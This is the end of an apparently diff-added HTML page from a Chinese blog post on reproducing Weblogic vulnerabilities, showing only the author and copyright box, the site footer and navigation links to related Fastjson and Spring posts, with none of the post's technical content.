+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#author-PeiQi"><span class="toc-text">author : PeiQi</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#from-http-wiki-peiqi-tech"><span class="toc-text">from   : http://wiki.peiqi.tech</span></a></li></ol>
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: hcncn</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://hcncn6.github.io/2022/09/05/复现/Weblogic/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+</div>
+
+    </main>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+      <div class="site-footer-info">
+        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
+      </div>
+    
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <div class="site-layer-input-choose">
+          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
+        </div>
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div class="bottom-bar-left">
+    <a href="/2022/09/05/复现/Fastjson/" data-enable="true">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/2022/09/05/复现/Spring/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+  
+  
+  
+  
+</div>
+    
+
+
+
+
+
+    
+  </body>
+</html>
